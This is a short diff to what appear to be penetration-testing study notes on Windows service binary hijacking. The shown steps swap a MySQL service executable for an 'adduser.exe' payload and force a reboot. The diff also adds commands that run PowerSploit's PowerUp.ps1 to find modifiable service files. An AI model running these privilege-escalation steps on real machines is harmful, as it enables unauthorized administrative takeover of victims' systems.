@@ -88,6 +88,12 @@ move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
 whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for the victim to manually start the service)
+shutdown /r /t 0
+
+Automatic Script:
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+.\PowerUp.ps1
+Get-ModifiableServiceFile
 ```
 
 ### Linux
